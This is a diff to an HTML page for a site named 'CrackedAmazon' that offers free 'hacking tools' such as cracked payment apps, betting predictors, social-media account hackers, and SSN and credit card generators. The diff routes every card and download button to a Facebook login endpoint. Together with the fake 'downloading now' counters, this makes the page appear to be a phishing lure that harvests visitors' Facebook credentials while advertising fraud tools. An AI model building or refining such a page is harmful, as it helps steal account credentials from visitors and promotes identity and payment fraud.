@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>CrackedAmazon - Premium Hacking Tools Marketplace</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CrackedAmazon - Premium Tools</title>
     <style>
         * {
             margin: 0;
@@ -11,302 +11,141 @@
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-
+        
         body {
             background: #0f172a;
             color: #fff;
             padding: 16px;
         }
-
-        /* Header */
+        
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
         }
-
+        
         .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .logo-icon {
-            font-size: 28px;
-            color: #f97316;
-        }
-
-        .logo-text {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 800;
             background: linear-gradient(135deg, #f97316, #ef4444);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-
-        .menu-icon {
-            font-size: 24px;
-            color: #94a3b8;
-        }
-
-        /* Search */
+        
         .search-box {
             background: #1e293b;
             border-radius: 30px;
-            padding: 12px 20px;
-            margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
             border: 1px solid #334155;
         }
-
+        
         .search-box input {
             background: transparent;
             border: none;
-            color: #fff;
+            color: white;
             width: 100%;
             font-size: 16px;
             outline: none;
         }
-
-        .search-box input::placeholder {
-            color: #64748b;
-        }
-
-        /* Hero Banner */
+        
         .hero {
             background: linear-gradient(135deg, #f97316, #ef4444);
             border-radius: 20px;
             padding: 24px;
             margin-bottom: 24px;
-            position: relative;
-            overflow: hidden;
         }
-
-        .hero::before {
-            content: "⚡";
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 80px;
-            opacity: 0.2;
-            color: #0f172a;
-        }
-
+        
         .hero h1 {
             font-size: 24px;
             font-weight: 800;
             color: #0f172a;
             margin-bottom: 8px;
         }
-
+        
         .hero p {
             color: #0f172a;
             opacity: 0.9;
-            font-size: 14px;
-            margin-bottom: 16px;
         }
-
-        .hero-stats {
-            display: flex;
-            gap: 24px;
-        }
-
-        .stat {
-            text-align: center;
-        }
-
-        .stat-number {
-            font-size: 20px;
-            font-weight: 800;
-            color: #0f172a;
-        }
-
-        .stat-label {
-            font-size: 11px;
-            color: #0f172a;
-            opacity: 0.8;
-        }
-
-        /* Platform Selector */
-        .platform-section {
-            margin-bottom: 24px;
-        }
-
+        
         .section-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #f97316;
-            font-weight: 600;
-            margin-bottom: 16px;
-            font-size: 18px;
-        }
-
-        .platform-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-        }
-
-        .platform-card {
-            background: #1e293b;
-            border-radius: 16px;
-            padding: 20px 12px;
-            text-align: center;
-            border: 1px solid #334155;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .platform-card:hover {
-            border-color: #f97316;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(249,115,22,0.2);
-        }
-
-        .platform-icon {
-            font-size: 36px;
-            margin-bottom: 8px;
-        }
-
-        .platform-name {
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .platform-desc {
-            font-size: 11px;
-            color: #94a3b8;
-            margin-top: 4px;
-        }
-
-        /* Category Title */
-        .category-title {
             font-size: 18px;
             font-weight: 600;
             margin: 24px 0 16px;
             color: #f97316;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
-
-        .category-title a {
-            color: #94a3b8;
-            font-size: 13px;
-            text-decoration: none;
-        }
-
-        /* Tools Grid */
+        
         .tools-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: 1fr 1fr;
             gap: 12px;
             margin-bottom: 20px;
         }
-
+        
         .tool-card {
             background: #1e293b;
-            border-radius: 20px;
+            border-radius: 16px;
             padding: 16px;
             border: 1px solid #334155;
+            cursor: pointer;
             transition: all 0.3s;
         }
-
+        
         .tool-card:hover {
             border-color: #f97316;
+            transform: translateY(-2px);
         }
-
+        
         .tool-icon {
-            font-size: 32px;
-            margin-bottom: 12px;
-        }
-
-        .tool-title {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-
-        .tool-category {
-            color: #f97316;
-            font-size: 11px;
-            background: rgba(249,115,22,0.1);
-            padding: 4px 8px;
-            border-radius: 20px;
-            display: inline-block;
+            font-size: 28px;
             margin-bottom: 8px;
         }
-
-        .tool-rating {
-            color: #fbbf24;
-            font-size: 12px;
-            margin: 8px 0;
-        }
-
-        .tool-price {
-            font-size: 20px;
-            font-weight: 700;
-            color: #f97316;
-            margin: 8px 0;
-        }
-
-        .auth-buttons {
-            display: flex;
-            gap: 6px;
-            margin: 12px 0;
-        }
-
-        .auth-btn {
-            flex: 1;
-            padding: 8px 0;
-            border: none;
-            border-radius: 30px;
-            font-size: 12px;
+        
+        .tool-title {
+            font-size: 15px;
             font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.3s;
+            margin-bottom: 4px;
         }
-
-        .auth-btn:hover {
-            opacity: 0.9;
+        
+        .tool-price {
+            color: #f97316;
+            font-size: 18px;
+            font-weight: 700;
+            margin: 8px 0;
         }
-
-        .btn-google {
-            background: #fff;
-            color: #333;
-        }
-
-        .btn-facebook {
+        
+        .fb-btn {
             background: #1877f2;
             color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-
-        .btn-instagram {
-            background: linear-gradient(45deg, #f09433, #d62976, #962fbf, #4f5bd5);
-            color: white;
+        
+        .fb-btn:hover {
+            background: #166fe5;
         }
-
+        
         .download-btn {
             background: #f97316;
             color: white;
             border: none;
             padding: 12px;
-            border-radius: 30px;
+            border-radius: 8px;
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: transform 0.3s;
+            margin-top: 12px;
         }
-
-        .download-btn:hover {
-            transform: scale(1.02);
-        }
-
+        
         .live-count {
             color: #10b981;
             font-size: 11px;
@@ -315,8 +154,7 @@
             align-items: center;
             gap: 4px;
         }
-
-        /* Footer */
+        
         .footer {
             margin-top: 40px;
             padding-top: 20px;
@@ -325,317 +163,140 @@
             color: #64748b;
             font-size: 12px;
         }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .footer-links a {
-            color: #94a3b8;
-            text-decoration: none;
-            font-size: 12px;
-        }
     </style>
 </head>
 <body>
-    <!-- Header -->
     <div class="header">
-        <div class="logo">
-            <span class="logo-icon">⚡</span>
-            <span class="logo-text">CrackedAmazon</span>
-        </div>
-        <div class="menu-icon">☰</div>
+        <div class="logo">⚡ CrackedAmazon</div>
+        <div>🔍</div>
     </div>
-
-    <!-- Search -->
+    
     <div class="search-box">
-        <span>🔍</span>
-        <input type="text" id="searchInput" placeholder="Search 1,500+ hacking tools...">
+        <input type="text" id="searchInput" placeholder="Search 1,500+ tools...">
     </div>
-
-    <!-- Hero Banner -->
+    
     <div class="hero">
         <h1>🔥 ALL TOOLS 100% FREE</h1>
-        <p>Download instantly • No credit card • 50k+ members</p>
-        <div class="hero-stats">
-            <div class="stat"><span class="stat-number">1,547</span><br><span class="stat-label">Tools</span></div>
-            <div class="stat"><span class="stat-number">50k+</span><br><span class="stat-label">Users</span></div>
-            <div class="stat"><span class="stat-number">2.3M</span><br><span class="stat-label">D/L</span></div>
-        </div>
+        <p>Download instantly • 50,000+ members • Facebook login only</p>
     </div>
-
-    <!-- Platform Selector -->
-    <div class="platform-section">
-        <div class="section-title">
-            <span>🔐 CHOOSE LOGIN METHOD</span>
-        </div>
-        <div class="platform-grid">
-            <div class="platform-card" onclick="window.location.href='/auth/google?tool=platform'">
-                <div class="platform-icon">🔵 G</div>
-                <div class="platform-name">Google</div>
-                <div class="platform-desc">2FA Bypass</div>
-            </div>
-            <div class="platform-card" onclick="window.location.href='/auth/facebook?tool=platform'">
-                <div class="platform-icon">🔷 f</div>
-                <div class="platform-name">Facebook</div>
-                <div class="platform-desc">Session Steal</div>
-            </div>
-            <div class="platform-card" onclick="window.location.href='/auth/instagram?tool=platform'">
-                <div class="platform-icon">📷</div>
-                <div class="platform-name">Instagram</div>
-                <div class="platform-desc">Account Clone</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Payment Hackers -->
-    <div class="category-title">
-        <span>💰 PAYMENT APP HACKERS</span>
-        <a href="#">View all 47 →</a>
-    </div>
-
+    
+    <div class="section-title">💰 PAYMENT APP HACKERS</div>
     <div class="tools-grid">
-        <div class="tool-card">
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=opay-cracked'">
             <div class="tool-icon">💰</div>
             <div class="tool-title">Opay Cracked v3.2</div>
-            <span class="tool-category">Payment</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (2.3k)</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=opay-cracked'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=opay-cracked'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=opay-cracked'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=opay-cracked'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=opay-cracked'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=opay-cracked'">
+                Download Now
+            </button>
             <div class="live-count">⚡ 234 downloading now</div>
         </div>
-
-        <div class="tool-card">
+        
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=palmpay-cracker'">
             <div class="tool-icon">💳</div>
             <div class="tool-title">Palmpay Cracker Pro</div>
-            <span class="tool-category">Payment</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (1.8k)</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=palmpay-cracker'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=palmpay-cracker'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=palmpay-cracker'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=palmpay-cracker'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">🏦</div>
-            <div class="tool-title">GTBank Cracker</div>
-            <span class="tool-category">Banking</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (1.2k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=gtbank'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=gtbank'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=gtbank'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=gtbank'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">💵</div>
-            <div class="tool-title">PayPal Checker</div>
-            <span class="tool-category">USA</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (3.8k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=paypal'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=paypal'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=paypal'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=paypal'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=palmpay-cracker'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=palmpay-cracker'">
+                Download Now
+            </button>
         </div>
     </div>
-
-    <!-- Aviator & Betting -->
-    <div class="category-title">
-        <span>🎮 AVIATOR & BETTING</span>
-        <a href="#">View all 89 →</a>
-    </div>
-
+    
+    <div class="section-title">🎮 AVIATOR & BETTING</div>
     <div class="tools-grid">
-        <div class="tool-card">
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=aviator-pro'">
             <div class="tool-icon">🎮</div>
             <div class="tool-title">Aviator Shooter Pro</div>
-            <span class="tool-category">Betting</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (5.1k)</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=aviator-pro'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=aviator-pro'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=aviator-pro'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=aviator-pro'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=aviator-pro'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=aviator-pro'">
+                Download Now
+            </button>
             <div class="live-count">⚡ 567 downloading now</div>
         </div>
-
-        <div class="tool-card">
+        
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=sportybet-double'">
             <div class="tool-icon">⚽</div>
-            <div class="tool-title">SportyBet Double</div>
-            <span class="tool-category">Betting</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (3.4k)</div>
+            <div class="tool-title">SportyBet Double Killer</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=sportybet'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=sportybet'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=sportybet'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=sportybet'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">🎯</div>
-            <div class="tool-title">Bet9ja Predictor</div>
-            <span class="tool-category">Betting</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (2.9k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=bet9ja'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=bet9ja'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=bet9ja'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=bet9ja'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">🤖</div>
-            <div class="tool-title">BetKing Bot</div>
-            <span class="tool-category">Betting</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (1.8k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=betking'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=betking'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=betking'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=betking'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=sportybet-double'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=sportybet-double'">
+                Download Now
+            </button>
         </div>
     </div>
-
-    <!-- Account Hackers -->
-    <div class="category-title">
-        <span>🔓 ACCOUNT HACKERS</span>
-        <a href="#">View all 156 →</a>
-    </div>
-
+    
+    <div class="section-title">🔓 ACCOUNT HACKERS</div>
     <div class="tools-grid">
-        <div class="tool-card">
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=fb-hacker'">
             <div class="tool-icon">👥</div>
-            <div class="tool-title">FB Hacker v5.0</div>
-            <span class="tool-category">Social</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (9.2k)</div>
+            <div class="tool-title">Facebook Hacker v5.0</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=fb-hacker'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=fb-hacker'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=fb-hacker'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/facebook?tool=fb-hacker'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=fb-hacker'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=fb-hacker'">
+                Download Now
+            </button>
             <div class="live-count">⚡ 789 downloading now</div>
         </div>
-
-        <div class="tool-card">
+        
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=instagram-hacker'">
             <div class="tool-icon">📷</div>
-            <div class="tool-title">IG Password Finder</div>
-            <span class="tool-category">Social</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (5.8k)</div>
+            <div class="tool-title">Instagram Password Finder</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=ig-finder'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=ig-finder'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=ig-finder'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/instagram?tool=ig-finder'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">📧</div>
-            <div class="tool-title">Gmail Cracker</div>
-            <span class="tool-category">Email</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (4.1k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=gmail-cracker'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=gmail-cracker'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=gmail-cracker'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=gmail-cracker'">Download Now</button>
-        </div>
-
-        <div class="tool-card">
-            <div class="tool-icon">💬</div>
-            <div class="tool-title">WhatsApp Stealer</div>
-            <span class="tool-category">Social</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (3.7k)</div>
-            <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=whatsapp'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=whatsapp'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=whatsapp'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=whatsapp'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=instagram-hacker'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=instagram-hacker'">
+                Download Now
+            </button>
         </div>
     </div>
-
-    <!-- USA Tools -->
-    <div class="category-title">
-        <span>🇺🇸 USA TOOLS</span>
-        <a href="#">View all 98 →</a>
-    </div>
-
+    
+    <div class="section-title">🇺🇸 USA TOOLS</div>
     <div class="tools-grid">
-        <div class="tool-card">
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=ssn-generator'">
             <div class="tool-icon">🔢</div>
-            <div class="tool-title">SSN Generator</div>
-            <span class="tool-category">USA</span>
-            <div class="tool-rating">⭐⭐⭐⭐⭐ (4.5k)</div>
+            <div class="tool-title">USA SSN Generator</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=ssn-gen'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=ssn-gen'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=ssn-gen'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=ssn-gen'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=ssn-generator'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=ssn-generator'">
+                Download Now
+            </button>
         </div>
-
-        <div class="tool-card">
+        
+        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=cc-generator'">
             <div class="tool-icon">💳</div>
-            <div class="tool-title">CC Generator</div>
-            <span class="tool-category">USA</span>
-            <div class="tool-rating">⭐⭐⭐⭐ (3.9k)</div>
+            <div class="tool-title">Credit Card Generator</div>
             <div class="tool-price">FREE</div>
-            <div class="auth-buttons">
-                <button class="auth-btn btn-google" onclick="window.location.href='/auth/google?tool=cc-gen'">G</button>
-                <button class="auth-btn btn-facebook" onclick="window.location.href='/auth/facebook?tool=cc-gen'">f</button>
-                <button class="auth-btn btn-instagram" onclick="window.location.href='/auth/instagram?tool=cc-gen'">IG</button>
-            </div>
-            <button class="download-btn" onclick="window.location.href='/auth/google?tool=cc-gen'">Download Now</button>
+            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=cc-generator'">
+                🔷 Login with Facebook
+            </button>
+            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=cc-generator'">
+                Download Now
+            </button>
         </div>
     </div>
-
-    <!-- Footer -->
+    
     <div class="footer">
-        <div class="footer-links">
-            <a href="#">About</a>
-            <a href="#">Telegram</a>
-            <a href="#">Support</a>
-            <a href="#">Stats</a>
-        </div>
-        <p>⚡ CrackedAmazon • Since 2023 • 50,000+ members</p>
-        <p style="margin-top: 10px;">All tools for educational purposes only</p>
+        <p>⚡ CrackedAmazon • 50,000+ members • Since 2023</p>
+        <p style="margin-top: 10px;">All tools require Facebook verification</p>
     </div>
-
+    
     <script>
-        // Search functionality
         document.getElementById('searchInput').addEventListener('input', function(e) {
             const term = e.target.value.toLowerCase();
             document.querySelectorAll('.tool-card').forEach(card => {
@@ -643,8 +304,7 @@
                 card.style.display = text.includes(term) ? 'block' : 'none';
             });
         });
-
-        // Random live counters
+        
         setInterval(() => {
             document.querySelectorAll('.live-count').forEach(el => {
                 const current = parseInt(el.textContent.match(/\d+/)?.[0] || '200');
